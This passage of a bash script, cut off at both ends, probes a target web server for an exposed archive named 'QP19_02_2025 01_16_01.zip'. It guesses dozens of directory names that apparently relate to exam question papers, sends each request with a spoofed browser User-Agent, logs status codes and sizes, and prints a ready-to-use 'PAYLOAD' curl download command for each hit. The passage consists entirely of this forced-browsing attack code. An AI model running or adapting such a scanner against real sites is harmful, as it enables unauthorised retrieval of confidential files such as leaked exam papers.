${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow-QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControl-QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControl-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControl-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem_Handling/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem_Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem_Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingQPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessor_QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessor_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessor_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DashboardQPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DashboardQPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DashboardQPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper_Suite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper_Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper_Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk_Panel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk_Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk_Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Control_QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Control_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Control_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase-Upload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase-Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase-Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessing-QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessing-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessing-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper-Module/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper-Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper-Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipelineQPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipelineQPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipelineQPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Control-Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Control-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Control-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto_Handler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto_Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto_Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOpsQsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOpsQsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOpsQsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSync_QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSync_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSync_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaperMonitoringTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaperMonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaperMonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Service-QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Service-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Service-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handling-QPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handling-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handling-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler_Service/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc_Panel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc_Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc_Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUpload-QPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUpload-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUpload-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ModuleQPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ModuleQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ModuleQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadService-QPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadService-QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadService-QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing-QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile_Dashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile_Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile_Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SyncQPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SyncQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SyncQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUpload-QPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUpload-QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUpload-QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Suite_QPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Suite_QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Suite_QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Manager-QPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Manager-QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Manager-QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Portal_Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Portal_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Portal_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService-FileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService-FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService-FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing_AutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing_AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing_AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulkBatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulkBatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulkBatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDocFileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDocFileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDocFileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP_DataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP_DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP_DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor-Handler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor-Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor-Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [WorkflowQ_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
